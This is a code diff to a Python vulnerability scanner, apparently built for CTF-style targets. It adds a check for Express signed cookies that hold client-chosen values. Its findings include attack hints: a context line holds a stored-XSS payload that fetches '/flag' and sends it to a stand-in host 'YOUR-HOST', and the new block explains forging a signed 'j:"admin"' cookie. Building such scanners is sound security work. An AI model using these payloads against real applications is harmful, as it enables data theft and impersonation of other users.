@@ -34,6 +34,7 @@ from .xff_trust_guard import find_xff_trust, XFF_LANGUAGES
 from .token_mass_assign_guard import find_token_mass_assign, TOKEN_MASS_ASSIGN_LANGUAGES
 from .aead_decipher_guard import find_aead_decipher_issues, AEAD_LANGUAGES
 from .store_html_xss_guard import find_store_html_xss, STORE_XSS_LANGUAGES
+from .signed_cookie_guard import find_signed_cookie_json, SIGNED_COOKIE_LANGUAGES
 
 # No hand-written vulnerable application code is ever a single line this long —
 # only minified/bundled vendor files (tailwindcss.js, jquery.min.js, etc.) are,
@@ -677,6 +678,30 @@ def scan_lines(path: str, language: str, lines: List[str], patterns: list) -> Li
                     "bot that views it.",
                 payload="Store <img src=x onerror=fetch('/flag').then(r=>r.text()).then(t=>location='//YOUR-HOST/?'+t)>"
                         " through the route that calls .set(), then have the victim/bot open the view route.",
+                confidence="likely",
+            ))
+
+    # Express signed cookie whose value is a client-chosen string, read
+    # back via req.signedCookies (cookie-parser JSON-decodes "j:" values).
+    # See signed_cookie_guard.py's module docstring.
+    if language in SIGNED_COOKIE_LANGUAGES:
+        for cf in find_signed_cookie_json(path, language, lines):
+            key = (cf.line_no, "Weak Auth Logic")
+            if key in seen:
+                continue
+            seen.add(key)
+            findings.append(Finding(
+                file=cf.file,
+                line_no=cf.line_no,
+                line_text=cf.line_text,
+                vuln_name="Weak Auth Logic",
+                severity="high",
+                why="A signed cookie is set to a value the client chose, and this app reads it back via "
+                    "req.signedCookies. cookie-parser JSON-decodes any cookie value starting with \"j:\" — "
+                    "signed ones included — so choosing the value j:\"<victim>\" yields a validly signed "
+                    "cookie that decodes to the string <victim> (or to an object/array of your choosing).",
+                payload="Register / submit the value j:\"admin\" (with the target username), then reuse the "
+                        "signed cookie the server sets.",
                 confidence="likely",
             ))
 
